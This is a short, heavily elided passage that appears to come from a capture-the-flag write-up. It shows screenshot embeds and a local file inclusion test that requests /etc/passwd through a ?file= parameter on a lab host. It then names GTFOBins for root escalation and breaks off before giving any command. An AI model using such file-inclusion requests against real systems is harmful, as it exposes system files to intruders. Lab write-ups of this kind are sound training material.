...
<img width="1245" height="499" alt="image" src="https://github.com/user-attachments/assets/734a5254-9cfa-4c3f-a593-43f68f64b736" />
...
<img width="1270" height="708" alt="image" src="https://github.com/user-attachments/assets/c22b-4357-946f-5ba1d1d4121a" />
...
Testing the parameter with `?file=` shows that we can include files. For example, using a world-readable file like `/etc/passwd`:  
`http://10.10.137.122:1337/file1010111/index.php?file=/etc/passwd`
...
```
After sending it, the response said:
...
According to GTFOBins, we can escalate to root using:
